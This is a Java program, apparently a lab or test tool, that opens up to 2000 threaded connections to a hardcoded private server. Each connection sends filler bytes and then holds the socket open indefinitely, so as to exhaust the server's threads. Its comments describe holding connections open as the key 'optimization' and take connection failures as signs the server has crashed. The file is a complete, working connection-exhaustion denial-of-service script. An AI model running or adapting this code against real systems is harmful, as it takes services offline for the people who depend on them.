import java.io.*;
import java.net.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class NewPayload {

    private static final String SERVER_ADDRESS = "10.0.101.82";
    private static final int SERVER_PORT = 12345;
    // Increased worker count to maximize concurrent connections
    // WARNING: Setting this too high may crash your OWN client before the server.
    private static final int WORKER_COUNT = 100;
    private static final int TOTAL_TASKS = 2000;
    private static final int PAYLOAD_SIZE = 1024; // Smaller payload is fine for this strategy

    public static void main(String[] args) {
        ExecutorService executor = Executors.newFixedThreadPool(WORKER_COUNT);
        byte[] buffer = new byte[PAYLOAD_SIZE];
        java.util.Arrays.fill(buffer, (byte) 'A');

        System.out.println("Starting connection exhaustion test with " + WORKER_COUNT + " active threads...");

        for (int i = 0; i < TOTAL_TASKS; i++) {
            final int taskId = i;
            executor.submit(() -> {
                try {
                    Socket socket = new Socket();
                    // 5-second timeout to connect, preventing client hangs on dead server
                    socket.connect(new InetSocketAddress(SERVER_ADDRESS, SERVER_PORT), 5000);

                    try (BufferedOutputStream out = new BufferedOutputStream(socket.getOutputStream())) {
                        // 1. Send initial data to establish intent
                        out.write(buffer);
                        out.flush();
                        System.out.println("Task " + taskId + ": Connected and payload sent.");

                        // 2. THE OPTIMIZATION: Hold the connection open indefinitely
                        // This prevents the server from closing the thread.
                        try {
                            Thread.sleep(Long.MAX_VALUE);
                        } catch (InterruptedException e) {
                            Thread.currentThread().interrupt();
                            System.err.println("Task " + taskId + " interrupted.");
                        }
                    }
                } catch (IOException e) {
                    // This error usually appears when the server has crashed or refuses connection
                    System.err.println("Task " + taskId + " failed (Server likely down): " + e.getMessage());
                }
            });

            // Small delay between launches to prevent overwhelming your local network card immediately
            try {
                Thread.sleep(10);
            } catch (InterruptedException e) {
            }
        }

        executor.shutdown();
        try {
            executor.awaitTermination(1, TimeUnit.HOURS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        System.out.println("Simulation complete.");
    }
}
